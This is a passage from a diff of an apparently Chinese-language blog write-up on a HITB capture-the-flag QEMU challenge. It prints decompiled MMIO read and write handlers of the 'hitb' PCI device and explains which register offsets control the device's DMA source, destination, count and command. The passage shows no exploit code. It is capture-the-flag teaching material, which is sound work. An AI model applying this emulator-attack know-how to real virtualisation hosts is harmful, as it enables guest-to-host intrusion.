-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
-      <span class=p>}</span>
-    <span class=p>}</span>
-    <span class=k>else</span>
-    <span class=p>{</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
-        <span class=n>val</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span><span class=p>;</span>
-        <span class=n>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
-        <span class=k>return</span> <span class=n>val</span><span class=p>;</span>
-      <span class=p>}</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mi>8</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>result</span> <span class=o>=</span> <span class=mh>0x10000EDLL</span><span class=p>;</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>addr</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span><span class=p>;</span>
-      <span class=p>}</span>
-      <span class=k>else</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x20</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>;</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x24</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>;</span>
-      <span class=p>}</span>
-    <span class=p>}</span>
-    <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
-  <span class=p>}</span>
-  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><ol>
-<li><code>addr == 0x80</code> &mdash;&mdash;> 读取dma.src</li>
-<li><code>addr == 0x84</code> &mdash;&mdash;> 读取dma.src高地址处4字节</li>
-<li><code>addr == 0x88</code> &mdash;&mdash;> 读取dma.dst</li>
-<li><code>addr == 0x8c</code> &mdash;&mdash;> 读取dma.dst高地址处4字节</li>
-<li><code>addr == 0x90</code> &mdash;&mdash;> 读取dma.cnt</li>
-<li><code>addr == 0x98</code> &mdash;&mdash;> 读取dma.cmd</li>
-</ol>
-<p>MMIO的<code>hitb_mmio_write</code>函数</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_read</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-20h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x8C</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mi>8</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=mh>0x10000EDLL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>addr</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x20</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x24</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol><li><code>addr == 0x80</code> &mdash;&mdash;> 读取dma.src</li><li><code>addr == 0x84</code> &mdash;&mdash;> 读取dma.src高地址处4字节</li><li><code>addr == 0x88</code> &mdash;&mdash;> 读取dma.dst</li><li><code>addr == 0x8c</code> &mdash;&mdash;> 读取dma.dst高地址处4字节</li><li><code>addr == 0x90</code> &mdash;&mdash;> 读取dma.cnt</li><li><code>addr == 0x98</code> &mdash;&mdash;> 读取dma.cmd</li></ol><p>MMIO的<code>hitb_mmio_write</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -614,124 +462,96 @@ $ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span
 </span><span class=lnt>87
 </span><span class=lnt>88
 </span><span class=lnt>89
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_write</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// er13
-</span><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// edx
-</span><span class=c1></span>  <span class=kt>bool</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// zf
-</span><span class=c1></span>  <span class=kt>int64_t</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// rax
-</span><span class=c1></span>  
-  <span class=c1>// !((size - 4) &amp; 0xFFFFFFFB) 等价于测试size第4bit是否为1并且低3bit是否为0
-</span><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x7F</span> <span class=o>||</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=n>size</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFB</span><span class=p>)</span> <span class=o>||</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=p>)</span>
-  <span class=p>{</span>
-    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>  <span class=c1>// 设置dma.src
-</span><span class=c1></span>    <span class=p>{</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
-        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-    <span class=p>}</span>
-    <span class=k>else</span>
-    <span class=p>{</span>
-      <span class=n>v4</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
-        <span class=p>{</span>
-          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
-            <span class=o>*</span><span class=p>(</span><span class=n>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-        <span class=p>}</span>
-        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x8C</span> <span class=p>)</span>
-        <span class=p>{</span>
-          <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>  <span class=c1>// 设置dma.cnt
-</span><span class=c1></span>          <span class=p>{</span>
-            <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
-              <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-          <span class=p>}</span>
-          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=o>&amp;&amp;</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.cmd
-</span><span class=c1></span>          <span class=p>{</span>
-            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-            <span class=n>v7</span> <span class=o>=</span> <span class=n>qemu_clock_get_ns</span><span class=p>(</span><span class=n>QEMU_CLOCK_VIRTUAL_0</span><span class=p>);</span>
-            <span class=n>timer_mod</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_timer</span><span class=p>,</span> <span class=n>v7</span> <span class=o>/</span> <span class=mi>1000000</span> <span class=o>+</span> <span class=mi>100</span><span class=p>);</span>
-          <span class=p>}</span>
-        <span class=p>}</span>
-        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
-        <span class=p>{</span>
-          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
-            <span class=o>*</span><span class=p>(</span><span class=n>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-        <span class=p>}</span>
-        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.dst
-</span><span class=c1></span>        <span class=p>{</span>
-          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
-        <span class=p>}</span>
-      <span class=p>}</span>
-      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>32</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x80</span> <span class=p>)</span>
-          <span class=n>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
-        <span class=k>else</span>
-          <span class=n>_InterlockedAnd</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0xFFFFFF7F</span><span class=p>);</span>
-      <span class=p>}</span>
-      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x20</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>96</span> <span class=p>)</span>
-        <span class=p>{</span>
-          <span class=n>v6</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>val</span> <span class=o>|</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
-          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=n>val</span><span class=p>;</span>
-          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v6</span> <span class=p>)</span>
-            <span class=n>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=mh>0x60u</span><span class=p>);</span>
-        <span class=p>}</span>
-        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>100</span> <span class=p>)</span>
-        <span class=p>{</span>
-          <span class=n>v5</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
-          <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&amp;</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
-          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>&amp;=</span> <span class=n>v5</span><span class=p>;</span>
-          <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>msi_enabled</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>)</span> <span class=p>)</span>
-            <span class=n>pci_set_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-        <span class=p>}</span>
-      <span class=p>}</span>
-      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
-      <span class=p>}</span>
-      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
-        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
-        <span class=n>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mi>1u</span><span class=p>);</span>
-        <span class=n>qemu_cond_signal</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_cond</span><span class=p>);</span>
-        <span class=n>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
-      <span class=p>}</span>
-    <span class=p>}</span>
-  <span class=p>}</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><ol>
-<li>
-<p><code>addr==0x80 && dma.cmd&1==0</code> &mdash;&ndash;> 设置dma.src</p>
-</li>
-<li>
-<p><code>addr==0x84 && dma.cmd&1==0</code> &mdash;&ndash;> 设置dma.src高地址处的4byte。</p>
-<p>（指向无定义空间，从上面dms_state的定义可以看出，其中的成员8字节对齐</p>
-</li>
-<li>
-<p><code>addr==0x88 && dma.cmd&1==0</code> &mdash;&ndash;> 设置dma.dst</p>
-</li>
-<li>
-<p><code>addr==0x8c && dma.cmd&1==0</code> &mdash;&ndash;> 同上</p>
-</li>
-<li>
-<p><code>addr==0x90 && dma.cmd&1==0</code> &mdash;&ndash;> 设置dma.cnt</p>
-</li>
-<li>
-<p><code>addr==0x98 && dma.cmd&1==0</code> &mdash;&ndash;> 设置dma.cmd，最低位需为1。同时<code>timer_mod</code>启动定时器，会触发<code>hitb_dma_timer</code></p>
-</li>
-</ol>
-<p><code>hitb_dma_timer</code>函数</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_write</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// er13
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// edx
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// zf
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int64_t</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  
+</span></span><span class=line><span class=cl>  <span class=c1>// !((size - 4) &amp; 0xFFFFFFFB) 等价于测试size第4bit是否为1并且低3bit是否为0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x7F</span> <span class=o>||</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=n>size</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFB</span><span class=p>)</span> <span class=o>||</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>  <span class=c1>// 设置dma.src
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
